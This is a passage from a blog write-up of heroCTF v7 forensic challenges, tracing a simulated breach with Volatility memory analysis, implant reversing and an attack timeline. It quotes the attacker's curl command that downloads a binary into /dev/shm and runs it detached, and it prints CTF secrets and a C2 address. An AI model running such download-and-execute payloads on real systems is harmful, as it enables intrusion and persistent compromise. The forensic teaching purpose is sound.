+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-k</span> https://xthaz.fr/kinit <span class="nt">-o</span> /dev/shm/kinit <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x /dev/shm/kinit <span class="o">&amp;&amp;</span> /dev/shm/kinit &amp; <span class="nb">disown</span><span class="se">\</span>
+</code></pre></div></div>
+<p>This payload performs the following actions:</p>
+<ul>
+  <li>Downloads a malicious binary named kinit from an attacker-controlled server</li>
+  <li>Stores the binary in /dev/shm, a memory-backed filesystem commonly abused to avoid disk forensics</li>
+  <li>Grants execute permissions to the binary</li>
+  <li>Executes the binary in the background and detaches it from the current shell</li>
+</ul>
+
+<p>This confirms successful Remote Code Execution via Laravel cookie deserialization, leading directly to post-exploitation.</p>
+
+<h3 id="secret-used-by-the-attacker-to-exploit-the-application">Secret used by the attacker to exploit the application</h3>
+<p>We already know the secret used by the attacker from the <code class="language-plaintext highlighter-rouge">.env</code> file, secret= <code class="language-plaintext highlighter-rouge">base64:zHJvDAIBtVN83kzkjqUZNv42w9gjd8FZZllqdqn0EBQ=</code></p>
+
+<h3 id="absolute-path-of-the-binary-used-for-post-exploitation">Absolute path of the binary used for post-exploitation</h3>
+<p>The binary was downloaded and executed by the malicious cookie payload after successful exploitation. The binary was located in
+<code class="language-plaintext highlighter-rouge">/dev/shm/kinit</code></p>
+
+<p>FLAG = <code class="language-plaintext highlighter-rouge">Hero{base64:zHJvDAIBtVN83kzkjqUZNv42w9gjd8FZZllqdqn0EBQ=;/dev/shm/kinit}</code></p>
+
+<h2 id="operation-pensieve-breach---7">Operation Pensieve Breach - 7</h2>
+
+<h3 id="attachment-6">Attachment</h3>
+<ul>
+  <li>spellbook_ram.7z</li>
+  <li>spellbook_shm.7z</li>
+</ul>
+
+<h3 id="description-6">Description</h3>
+<p>You understood every exploitation step of the attacker. It’s time to perform a final analysis and find what infrastructure the attacker used for the pensieve breach.</p>
+
+<p>Please find the following information about how the attacker compromised the server:</p>
+<ul>
+  <li>PID of the implant running.</li>
+  <li>IP address of the attacking server where all the attack took place.</li>
+  <li>Port used by the attacker for his implant callback.</li>
+  <li>Secret used by the attacker to connect to the implant.</li>
+  <li>Local username of the attacker on his attacking machine.</li>
+</ul>
+
+<p>The findings have to be separated by a “;”. <br />
+Here is an example flag format: <code class="language-plaintext highlighter-rouge">Hero{1000;127.0.0.1;123;TheSecret!Used?;username}</code></p>
+
+<h3 id="infrastructure-analysis">Infrastructure Analysis</h3>
+<p>At this stage, a Linux memory dump and the implant binary (kinit) were provided.
+The objective is to identify the attacker’s infrastructure and understand how the implant operates, including its runtime context, callback details, and authentication mechanism.</p>
+
+<p>Because this is a Linux memory dump, Volatility is required for analysis. However, Volatility requires a matching Linux kernel symbol table, which is not provided by default. Therefore, the first step is to identify the kernel version used by the victim system.</p>
+
+<p>To identify the kernel version, the following Volatility plugin was used:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> vol <span class="nt">-f</span> spellbook_ram.dump banners
+</code></pre></div></div>
+<p><img src="/assets/heroCTF/7.png" alt="alt text" />
+From the output, two kernel versions were observed:</p>
+<ul>
+  <li>6.1.0-29-amd64</li>
+  <li>6.1.0-41-amd64</li>
+</ul>
+
+<p>Since 6.1.0-41-amd64 appeared most frequently across the banners, this version was selected as the most likely kernel version used at runtime.</p>
+
+<p>Because no symbol table was provided, it had to be built manually. This was done using Docker to ensure a clean and reproducible environment. A Debian 12 container was used, along with the matching kernel image and debug symbols:</p>
+<div class="language-Dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> debian:12</span>
+
+<span class="k">ENV</span><span class="s"> DEBIAN_FRONTEND=noninteractive</span>
+
+<span class="c"># Enable debug symbol repo</span>
+<span class="k">RUN </span><span class="nb">echo</span> <span class="s2">"deb http://deb.debian.org/debian-debug bookworm-debug main"</span> <span class="se">\
+</span>    <span class="o">&gt;</span> /etc/apt/sources.list.d/debug.list
+
+<span class="c"># Install ONLY required packages</span>
+<span class="k">RUN </span>apt update <span class="o">&amp;&amp;</span> apt <span class="nb">install</span> <span class="nt">-y</span> <span class="se">\
+</span>    linux-image-6.1.0-41-amd64 <span class="se">\
+</span>    linux-image-6.1.0-41-amd64-dbg <span class="se">\
+</span>    dwarfdump <span class="se">\
+</span> <span class="o">&amp;&amp;</span> <span class="nb">rm</span> <span class="nt">-rf</span> /var/lib/apt/lists/<span class="k">*</span>
+
+<span class="k">WORKDIR</span><span class="s"> /out</span>
+
+<span class="c"># Copy dwarf2json</span>
+<span class="k">COPY</span><span class="s"> dwarf2json /usr/local/bin/dwarf2json</span>
+<span class="k">RUN </span><span class="nb">chmod</span> +x /usr/local/bin/dwarf2json
+
+<span class="c"># Build symbol table</span>
+<span class="k">RUN </span>dwarf2json linux <span class="se">\
+</span>    <span class="nt">--elf</span> /usr/lib/debug/boot/vmlinux-6.1.0-41-amd64 <span class="se">\
+</span>    <span class="o">&gt;</span> /out/debian_6.1.0-41-amd64.json
+
+<span class="k">CMD</span><span class="s"> ["bash"]</span>
+</code></pre></div></div>
+<p>After building the symbol file, it was copied into Volatility’s symbol directory <code class="language-plaintext highlighter-rouge">symbols/linux/debian_6.1.0-41-amd64.json</code></p>
+
+<h3 id="pid-of-the-implant-running">PID of the implant running</h3>
+<p>From previous analysis, the malicious binary delivered to the victim was identified as kinit.
+Therefore, process enumeration was performed to locate this binary in memory:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol <span class="nt">-f</span> spellbook_ram.dump linux.pslist | <span class="nb">grep</span> <span class="s1">'kinit'</span>
+</code></pre></div></div>
+<p><img src="/assets/heroCTF/7a.png" alt="alt text" />
+From the output, the running implant process was identified as:</p>
+<ul>
+  <li>PID : <code class="language-plaintext highlighter-rouge">23033</code></li>
+  <li>Process Name : <code class="language-plaintext highlighter-rouge">kinit</code></li>
+</ul>
+
+<h3 id="attacker-ip-address-and-callback-port">Attacker IP Address and Callback Port</h3>
+<p>To identify active network connections associated with the implant, socket information was inspected:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol <span class="nt">-f</span> spellbook_ram.dump linux.sockstat | <span class="nb">grep</span> <span class="s2">"kinit"</span>
+</code></pre></div></div>
+<p><img src="/assets/heroCTF/7b.png" alt="alt text" />
+Two local IP addresses were observed:</p>
+<ul>
+  <li>10.0.2.15</li>
+  <li>192.168.56.200</li>
+</ul>
+
+<p>Both addresses are private/internal interfaces of the compromised host and therefore cannot represent the attacker’s infrastructure.</p>
+
+<p>More importantly, the implant shows an outbound connection to an external IP address <code class="language-plaintext highlighter-rouge">51.75.120.170</code>. This IP corresponds to the Command-and-Control (C2) server previously identified during reverse shell analysis.
+The connection is established over port 53, which is commonly abused by implants to blend into DNS traffic and bypass firewall restrictions.</p>
+
+<h3 id="secret-used-by-the-attacker-to-connect-to-the-implant">Secret used by the attacker to connect to the implant</h3>
+<p>To identify the authentication secret, the kinit binary was reversed. Initial inspection revealed that kinit was packed using UPX. The binary was first unpacked before reversing. After unpacking, the binary was analyzed using IDA.</p>
+
+<p>Inside the main_main function, a call chain related to session initialization was observed, including a function named <code class="language-plaintext highlighter-rouge">main_createSSHSessionHandler</code>. During analysis of this logic, a hardcoded credential was passed into a password handler routine.
+<img src="/assets/heroCTF/7c.png" alt="alt text" />
+Navigating to the referenced <code class="language-plaintext highlighter-rouge">.rodata</code> section revealed the following string:
+<img src="/assets/heroCTF/7d.png" alt="alt text" />
+This string is clearly used as a static authentication secret during the implant’s connection phase.
+Secret used by the attacker: <code class="language-plaintext highlighter-rouge">?8@XdCNymdoH5CkgigiL</code></p>
+
+<h3 id="local-username-of-the-attacker-on-his-attacking-machine">Local username of the attacker on his attacking machine</h3>
+<p>Further inspection of the <code class="language-plaintext highlighter-rouge">.rodata</code> section revealed an additional path string:
+<img src="/assets/heroCTF/7e.png" alt="alt text" />
+This strongly indicates that:</p>
+<ul>
+  <li>The implant was compiled on a machine belonging to user <code class="language-plaintext highlighter-rouge">xthaz</code></li>
+  <li>The build environment used Go (go1.15) under that user’s home directory</li>
+</ul>
+
+<p>FLAG: <code class="language-plaintext highlighter-rouge">Hero{23033;51.75.120.170;53;?8@XdCNymdoH5CkgigiL;xthaz}</code></p>
+
+<h3 id="attack-timeline">Attack Timeline</h3>
+<ol>
+  <li>The attacker obtained a leaked Laravel <code class="language-plaintext highlighter-rouge">APP_KEY</code> on <code class="language-plaintext highlighter-rouge">spellbook.hogwarts.local</code> and used it to craft a malicious encrypted cookie, resulting in unauthenticated remote code execution.</li>
+  <li>Using this access, the attacker downloaded and executed a malicious implant (kinit) directly in memory, which established a callback to the attacker-controlled server.</li>
+  <li>The attacker then pivoted to <code class="language-plaintext highlighter-rouge">pensieve.hogwarts.local</code> (GLPI) using a compromised authenticated session belonging to <code class="language-plaintext highlighter-rouge">neville.longbottom</code>, exploiting CVE-2024-37149 to gain remote code execution.</li>
+  <li>A malicious webshell was deployed, and the GLPI authentication component (Auth.php) was overwritten with a backdoored version that harvested user credentials.</li>
+  <li>The attacker retrieved the credentials of <code class="language-plaintext highlighter-rouge">albus.dumbledore</code> from the harvested data and authenticated against internal infrastructure.</li>
+  <li>Using these credentials, the attacker performed a DCsync attack against the Domain Controller, successfully accessing directory replication data.</li>
+  <li>In parallel, the attacker accessed <code class="language-plaintext highlighter-rouge">gringotts01.hogwarts.local</code> and escalated privileges using a Bring-Your-Own-Vulnerable-Driver (BYOVD) technique.</li>
+  <li>With kernel-level access, LSASS memory was dumped, exposing additional credentials.</li>
+  <li>The attacker abused SQL Server administrative privileges to execute operating system commands, stage payloads, and deploy a reverse shell.</li>
+  <li>The malicious implant remained active in memory, maintaining persistent command-and-control communication with the attacker’s infrastructure.</li>
+</ol>
+
+<p>This challenge was especially enjoyable due to how closely it mirrors a real-world DFIR investigation. Each stage required correlating evidence across multiple data sources, reinforcing the importance of methodical analysis over isolated exploitation techniques.</p>
+
+<p>Huge credit to the challenge author and the heroCTF team for designing this scenario.</p>]]></content><author><name>Jaysen</name></author><category term="CTF |" /><category term="Forensics |" /><category term="DFIR" /><category term="heroCTF" /><category term="ActiveDirectory" /><category term="DCsync" /><category term="GLPI" /><category term="BYOVD" /><summary type="html"><![CDATA[About a month ago, I participated in heroCTF v7 with my team, CSUI, where we finished 9th overall and successfully solved all forensic challenges. I personally handled most of the forensic tracks, which turned out to be among the most enjoyable and realistic CTF challenges I have experienced so far.]]></summary></entry></feed>
